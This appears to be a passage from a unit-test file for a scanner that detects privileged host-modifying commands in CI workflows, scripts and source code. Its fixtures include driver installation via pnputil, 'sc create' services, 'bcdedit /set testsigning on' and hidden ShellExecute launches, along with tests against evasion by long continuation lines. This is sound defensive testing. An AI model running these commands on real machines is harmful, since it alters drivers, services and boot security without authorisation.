        clean_yaml = (
            "name: Build\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - name: Many commands\n"
            "        run: |\n"
            "          echo 1\n"
            "          echo 2\n"
            "          echo 3\n"
            "          echo 4\n"
            "          echo 5\n"
            "          echo 6\n"
            "          echo 7\n"
            "          echo 8\n"
            "          echo 9\n"
            "          echo 10\n"
            "          echo 11\n"
            "          echo 12\n"
        )
        clean_findings = self.scan_source("clean_workflow.yml", clean_yaml)
        self.assertEqual([f for f in clean_findings if f.rule.startswith("HOST")], [])

        clean_15_yaml = (
            "name: Build\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - name: 15-line continued command\n"
            "        run: |\n"
            "          ruff check \\\n"
            + "".join(f"            file_{i}.py \\\n" for i in range(1, 14))
            + "            file_14.py\n"
        )
        clean_15_findings = self.scan_source("clean_15.yml", clean_15_yaml)
        self.assertEqual(
            [f for f in clean_15_findings if f.rule.startswith("HOST")], []
        )

        adv_15_yaml = (
            "name: Test\n"
            "steps:\n"
            "  - name: Step\n"
            "    run: |\n"
            "      echo line 5 \\\n"
            + "".join(f"        && echo line {i} \\\n" for i in range(6, 19))
            + "        && pnputil.exe /add-driver bad.inf\n"
        )
        adv_15_findings = self.scan_source("adv_15.yml", adv_15_yaml)
        self.assertEqual(len(adv_15_findings), 1)
        self.assertEqual(adv_15_findings[0].rule, "HOST001")
        self.assertEqual(adv_15_findings[0].severity, "critical")
        self.assertEqual(adv_15_findings[0].line, 5)

        adv_yaml = (
            "name: Test\n"
            "steps:\n"
            "  - name: Step\n"
            "    run: |\n"
            "      echo line 5\n"
            "      echo line 6\n"
            "      echo line 7\n"
            "      echo line 8\n"
            "      echo line 9\n"
            "      echo line 10\n"
            "      echo line 11\n"
            "      echo line 12\n"
            "      pnputil.exe /add-driver bad.inf\n"
            "      echo line 14\n"
        )
        adv_findings = self.scan_source("adv_workflow.yml", adv_yaml)
        self.assertEqual(len(adv_findings), 1)
        self.assertEqual(adv_findings[0].rule, "HOST001")
        self.assertEqual(adv_findings[0].severity, "critical")
        self.assertEqual(adv_findings[0].line, 13)

        overflow_continued_yaml = (
            "name: Test\n"
            "steps:\n"
            "  - run: |\n"
            "      echo 1 \\\n"
            + "".join(f"        && echo {i} \\\n" for i in range(2, 33))
            + "        && echo 33\n"
        )
        overflow_findings = self.scan_source(
            "overflow_yaml.yml", overflow_continued_yaml
        )
        self.assertTrue(
            any(
                f.rule == "HOST001"
                and f.severity == "critical"
                and f.line == 4
                and "exceeds analyzable limit" in f.message
                for f in overflow_findings
            )
        )

        folded_overflow_yaml = "name: Test\nsteps:\n  - run: >\n" + "".join(
            f"      echo {i}\n" for i in range(1, 34)
        )
        folded_findings = self.scan_source("folded_overflow.yml", folded_overflow_yaml)
        self.assertTrue(
            any(
                f.rule == "HOST001"
                and f.severity == "critical"
                and f.line == 3
                and "exceeds analyzable limit" in f.message
                for f in folded_findings
            )
        )

    # Clean Tests
    def test_unprivileged_xrt_runtime_is_clean(self):
        cpp_source = (
            "#include <xrt/xrt_device.h>\n"
            "#include <xrt/xrt_bo.h>\n"
            "void run() {\n"
            "    auto device = xrt::device(0);\n"
            '    auto uuid = device.load_xclbin("kernel.xclbin");\n'
            "    auto bo = xrt::bo(device, 1024, XRT_BO_FLAGS_HOST_ONLY, 0);\n"
            "    bo.sync(XCL_BO_SYNC_BO_TO_DEVICE);\n"
            "}\n"
        )
        findings = self.scan_source("xrt_runtime.cpp", cpp_source)
        critical_findings = [
            f
            for f in findings
            if f.rule.startswith("HOST") and f.severity == "critical"
        ]
        self.assertEqual(critical_findings, [])

    def test_readonly_diagnostic_commands_are_clean(self):
        script_source = (
            "pnputil /enum-drivers\n"
            "devcon status PCI\\*\n"
            "devcon hwids ROOT\\*\n"
            "dism.exe /online /export-driver /destination:C:\\DriverBackup\n"
            "dism /online /get-drivers /format:table\n"
            "reg query HKLM\\Software\\AMD\n"
            "Get-Service -Name amd*\n"
            "sc query amd_npu\n"
            "bcdedit /enum\n"
        )
        findings = self.scan_source("diagnostics.ps1", script_source)
        critical_findings = [
            f
            for f in findings
            if f.rule.startswith("HOST") and f.severity == "critical"
        ]
        self.assertEqual(critical_findings, [])

    def test_isolated_memory_allocation_declarations_are_clean(self):
        cpp_source = (
            "#include <windows.h>\n"
            "void* alloc(size_t sz) {\n"
            "    return VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
            "}\n"
        )
        findings = self.scan_source("alloc.cpp", cpp_source)
        critical_findings = [
            f
            for f in findings
            if f.rule.startswith("HOST") and f.severity == "critical"
        ]
        self.assertEqual(critical_findings, [])

    def test_secure_memory_clearing_is_clean(self):
        cpp_source = (
            "#include <windows.h>\n"
            "#include <string.h>\n"
            "void wipe(void* ptr, size_t len) {\n"
            "    SecureZeroMemory(ptr, len);\n"
            "    memset_s(ptr, len, 0, len);\n"
            "}\n"
        )
        findings = self.scan_source("wipe.cpp", cpp_source)
        critical_findings = [
            f
            for f in findings
            if f.rule.startswith("HOST") and f.severity == "critical"
        ]
        self.assertEqual(critical_findings, [])

    def test_process_launching_sinks_in_cpp_and_python_are_blocked(self):
        cpp_sys_findings = self.scan_source(
            "sink.cpp",
            '#include <stdlib.h>\nvoid bad() { system("pnputil /add-driver bad.inf"); }\n',
        )
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical"
                for f in cpp_sys_findings
            )
        )

        cpp_shell_findings = self.scan_source(
            "sink.cpp",
            '#include <windows.h>\nvoid bad() { ShellExecuteA(NULL, "open", "sc.exe", "create BadSvc", NULL, SW_HIDE); }\n',
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in cpp_shell_findings
            )
        )

        py_subproc_findings = self.scan_source(
            "sink.py",
            'import subprocess\nsubprocess.run(["pnputil", "/add-driver", "bad.inf"])\n',
        )
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical"
                for f in py_subproc_findings
            )
        )

        py_os_findings = self.scan_source(
            "sink.py",
            'import os\nos.system("bcdedit /set testsigning on")\n',
        )
        self.assertTrue(
            any(
                f.rule == "HOST004" and f.severity == "critical" for f in py_os_findings
            )
        )

    def test_ordinary_identifiers_and_variables_in_cpp_and_python_are_clean(self):
        cpp_source = (
            "struct State {\n"
            "    int sc;\n"
            "    int reg;\n"
            "    int devcon_id;\n"
            "};\n"
            "void compute() {\n"
            "    int sc = 10;\n"
            "    int reg = 20;\n"
            '    const char* str = "reg_test";\n'
            "}\n"
        )
        cpp_findings = self.scan_source("identifiers.cpp", cpp_source)
        self.assertEqual([f for f in cpp_findings if f.rule.startswith("HOST")], [])

        py_source = (
            "sc = 1\n"
            "reg = 2\n"
            'pnputil_info = {"status": "ok"}\n'
            "def check_reg(reg_val):\n"
            "    return reg_val + 1\n"
            " combustion = 100\n"
        )
        py_findings = self.scan_source("identifiers.py", py_source)
        self.assertEqual([f for f in py_findings if f.rule.startswith("HOST")], [])

    def test_logical_command_overflow_fails_closed(self):
        ps_source = (
            "$cmd = 'part1' `\n"
            + "".join(f"  + 'part{i}' `\n" for i in range(2, 33))
            + "  + 'part33'\n"
        )
        ps_findings = self.scan_source("overflow.ps1", ps_source)
        self.assertTrue(
            any(
                f.rule == "HOST001"
                and f.severity == "critical"
                and "exceeds analyzable limit" in f.message
                for f in ps_findings
            )
        )

        sh_source = (
            "echo 1 \\\n"
            + "".join(f"  && echo {i} \\\n" for i in range(2, 33))
            + "  && pnputil /add-driver bad.inf\n"
        )
        sh_findings = self.scan_source("overflow.sh", sh_source)
        self.assertTrue(
            any(
                f.rule == "HOST001"
                and f.severity == "critical"
                and "exceeds analyzable limit" in f.message
                for f in sh_findings
            )
        )

        long_sh_source = "echo " + ("a" * 4100) + "\n"
        long_findings = self.scan_source("overflow_chars.sh", long_sh_source)
        self.assertTrue(
            any(
                f.rule == "HOST001"
                and f.severity == "critical"
                and "exceeds analyzable limit" in f.message
                for f in long_findings
            )
        )

    def test_scanner_performance_and_backtracking_regression(self):
        """Verify scanning a 40,000+ line adversarial fixture with non-matching prefixes

        terminates within 15 seconds in an isolated child process without catastrophic backtracking.
        """
        import sys

        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            temp_dir = Path(temporary)
            large_cpp = temp_dir / "large_stress_test.cpp"

            lines = []
            for i in range(10000):
                lines.append(f"int sc_{i} = {i};\n")
                lines.append(f"uint32_t reg_val_{i} = 0x{i:04X};\n")
                lines.append(f"// devcon status note {i}\n")
                lines.append(f'const char* pnputil_str_{i} = "query_only";\n')

            mutation_line = len(lines) + 1
            lines.append('void bad() { system("pnputil.exe /add-driver bad.inf"); }\n')
            large_cpp.write_bytes("".join(lines).encode("utf-8"))

            child_code = (
                "import sys\n"
                "from pathlib import Path\n"
                "from tools.agent_integrity import scan_cpp_file\n"
                f"findings = scan_cpp_file(Path(r'{large_cpp.relative_to(REPO_ROOT).as_posix()}'))\n"
                f"assert len(findings) == 1, f'Expected 1 finding, got {{len(findings)}}'\n"
                f"assert findings[0].rule == 'HOST001', f'Expected HOST001, got {{findings[0].rule}}'\n"
                f"assert findings[0].line == {mutation_line}, f'Expected line {mutation_line}, got {{findings[0].line}}'\n"
                f"preceding_findings = [f for f in findings if f.line < {mutation_line}]\n"
                "assert len(preceding_findings) == 0, f'Expected 0 preceding findings, got {len(preceding_findings)}'\n"
                "print('PERF_STRESS_PASSED')\n"
            )

            proc = subprocess.run(
                [sys.executable, "-c", child_code],
                cwd=str(REPO_ROOT),
                capture_output=True,
                text=True,
                timeout=15,
                check=False,
            )
            self.assertEqual(proc.returncode, 0, f"Child process failed: {proc.stderr}")
            self.assertIn("PERF_STRESS_PASSED", proc.stdout)

    def test_comments_with_forbidden_terms_are_clean(self):
        cpp_source = (
            "// Prohibited command example: pnputil /add-driver bad.inf\n"
            "/* Multi-line comment: Start-Process -Verb RunAs */\n"
            "void harmless() {}\n"
        )
        cpp_findings = self.scan_source("doc_comments.cpp", cpp_source)
        self.assertEqual([f for f in cpp_findings if f.rule.startswith("HOST")], [])

        ps_source = (
            "# pnputil /add-driver is forbidden in scripts\n"
            "<#\n"
            "  bcdedit /set testsigning on is blocked\n"
            "#>\n"
            "Write-Host 'Hello'\n"
        )
        ps_findings = self.scan_source("doc_comments.ps1", ps_source)
        self.assertEqual([f for f in ps_findings if f.rule.startswith("HOST")], [])

        cmake_source = (
            "# CMake comment: pnputil /add-driver forbidden\n"
            "cmake_minimum_required(VERSION 3.20)\n"
        )
        cmake_findings = self.scan_source("CMakeLists.txt", cmake_source)
        self.assertEqual([f for f in cmake_findings if f.rule.startswith("HOST")], [])

        yaml_source = "# YAML comment: sc create BadSvc forbidden\nname: CI\n"
        yaml_findings = self.scan_source("ci.yml", yaml_source)
        self.assertEqual([f for f in yaml_findings if f.rule.startswith("HOST")], [])


if __name__ == "__main__":
    unittest.main()
